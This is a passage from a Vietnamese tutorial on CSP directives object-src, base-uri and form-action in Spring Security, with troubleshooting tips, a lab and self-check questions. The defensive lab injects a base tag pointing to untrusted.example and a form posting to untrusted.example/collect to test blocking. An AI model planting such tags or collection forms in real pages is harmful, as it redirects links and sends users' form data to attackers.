| Ứng dụng SPA tải sai asset sau khi bật CSP | Thẻ `<base href>` hợp lệ bị `base-uri 'none'` từ chối | Dùng URL phù hợp hoặc cân nhắc `base-uri 'self'` |
| Link tương đối đi sang domain lạ | Thẻ base bị chèn hoặc logic URL sai | Kiểm tra `base-uri`, escape HTML và DOM/template |
| Form đăng nhập nội bộ không submit được | `form-action 'none'` hoặc một policy khác chặn | Đặt `form-action 'self'` nếu đúng kiến trúc |
| SAML/SSO POST hoặc form thanh toán thất bại | `form-action 'self'` không cho đích ngoài | Cho phép đúng IdP/payment origin sau khi xác minh |
| Form ngoài bị chặn nhưng `fetch` vẫn chạy | `form-action` không điều khiển fetch | Kiểm tra `connect-src` và CORS |
| Form cùng origin submit nhưng server trả 403 | CSRF token, authorization hoặc logic server | Kiểm tra CSRF/permissions; không nới CSP vô cớ |
| Có `default-src 'none'` mà form vẫn gửi ngoài | `form-action` không kế thừa `default-src` | Khai báo `form-action` riêng |
| Có CSP ở API JSON nhưng HTML không bị ràng buộc | CSP đặt sai origin/phạm vi response | Đặt policy tại nơi phục vụ HTML |
| Form bị chặn dù một policy cho phép | Có nhiều CSP thực thi trên cùng response | Kiểm tra toàn bộ header từ Spring và proxy |
| Chỉ thấy cảnh báo nhưng hành vi vẫn diễn ra | Có thể đang dùng Report-Only | Phân biệt header và kiểm tra với enforcement ở môi trường test |
| Form bị chuyển hướng đến URL không mong muốn | Backend redirect hoặc URL thao tác ngoài phạm vi CSP | Rà soát redirect, allowlist server và hỗ trợ browser |

### Ba sai lầm cần tránh

**Sai lầm 1 — chỉ cần `default-src 'none'`.** Policy này có thể làm fallback của object bị chặn, nhưng không tạo giới hạn `base-uri` và `form-action`. Cần khai báo hai directive kia rõ ràng.

**Sai lầm 2 — form-action là CSRF protection.** CSP của trang có thể chặn trang ấy gửi form sang đích ngoài, nhưng không tự chặn một website khác gửi yêu cầu giả mạo tới server. Cần CSRF protection ở phía server và thiết kế cookie/session phù hợp.

**Sai lầm 3 — object-src là frame-src.** Nhúng PDF bằng object, tải một iframe và ngăn người khác nhúng trang hiện tại là các hoạt động khác nhau. Chọn `object-src`, `frame-src` và `frame-ancestors` theo đúng hướng tải tài nguyên.

## 15. Bài thực hành tổng hợp

**Bối cảnh:** Xây dựng một dashboard Spring Boot có form cập nhật hồ sơ cùng origin, một liên kết trợ giúp tương đối và một nút tải tài liệu. Giả lập thêm trang có form submit đến nhà cung cấp SSO ở origin riêng. Nhiệm vụ là chặn đường chèn nội dung mà vẫn giữ chức năng hợp lệ.

1. Cấu hình CSP bắt đầu bằng `default-src 'self'; object-src 'none'; base-uri 'none'; form-action 'self'`. Kiểm tra header HTTP trên response HTML bằng MockMvc hoặc WebTestClient.
2. Thử `<object>`/`<embed>` nạp một PDF cùng origin. Giải thích vì sao nó vẫn bị từ chối, sau đó so sánh với liên kết download PDF thông thường.
3. Trong trang test riêng, chèn `<base href="https://untrusted.example/">` rồi kiểm tra `document.baseURI` và URL của liên kết tương đối. So sánh với trang không có CSP hoặc với policy trong môi trường test cho phép base cụ thể.
4. Tạo hai form: một submit về `/profile/update`, một submit đến `https://untrusted.example/collect`. Kiểm tra bằng Network và Console thay vì giả định kết quả từ code.
5. Thêm nút `formaction` trỏ đến nguồn ngoài và xác minh `form-action` cũng kiểm soát đích submit đó.
6. Thử một luồng SSO dạng POST form sang IdP đã cấu hình trong môi trường học tập; bổ sung đúng IdP origin vào `form-action` thay vì mở `https:`.
7. Thử một yêu cầu `fetch` cross-origin; giải thích vai trò riêng của `connect-src` và CORS, không sửa `form-action` cho lỗi fetch.
8. Gửi form hợp lệ về cùng origin nhưng thiếu CSRF token trong môi trường yêu cầu CSRF; lý giải vì sao CSP cho phép request mà server vẫn từ chối.
9. Lặp lại cấu hình ở Spring Security Reactive/WebFlux; so sánh response header và hành vi browser, sau đó xác định tầng nào phải phát CSP nếu HTML được phục vụ bởi CDN.

**Câu hỏi tự đánh giá:**

1. Vì sao `object-src 'none'` có thể chặn PDF khi nhúng bằng `<object>` nhưng không tự nói gì về PDF được tải bằng một liên kết download?
2. `default-src 'none'` có tự ngăn thẻ `<base>` và form gửi ngoài origin không?
3. Khi nào chọn `base-uri 'none'`, khi nào cần xem xét `base-uri 'self'`?
4. Một thẻ `<base>` được chấp nhận có thể thay đổi cách phân giải những URL nào?
5. `form-action 'self'` có áp dụng khi nút submit dùng thuộc tính `formaction` không?
6. Vì sao `form-action` không thay thế CSRF token và không kiểm soát `fetch`?
7. Một form SAML POST trực tiếp đến IdP khác origin có thể cần cập nhật directive nào?
8. Khi dùng `object-src 'none'`, bạn cần xem xét thêm directive nào nếu sản phẩm dùng iframe?
9. Nếu một trang vẫn bị chặn dù bạn thấy một CSP cho phép, cần kiểm tra những nguồn header nào?

## 16. Ghi nhớ

**`object-src`, `base-uri` và `form-action` bảo vệ ba bề mặt khác nhau**: tải object/embed, thay đổi base URL và gửi form. `object-src` có thể fallback từ `default-src`, còn `base-uri` và `form-action` **không kế thừa** `default-src`, nên cần cấu hình trực tiếp.

Với ứng dụng không dùng object hay base tag và chỉ có form nội bộ, một điểm khởi đầu rõ ràng là `object-src 'none'; base-uri 'none'; form-action 'self'`. Nếu có PDF viewer, SSO hoặc thanh toán ngoài origin, phải mở đúng nguồn được đánh giá và kiểm thử trong trình duyệt thực tế. Trong Spring Security Servlet/WebFlux, ứng dụng cung cấp policy, Spring Security xuất header trên response HTML, còn trình duyệt thực thi. CSP là lớp phòng vệ bổ sung cùng escape/sanitize HTML, CSRF, CORS, security headers, HSTS, HTTP firewall và bảo vệ session.
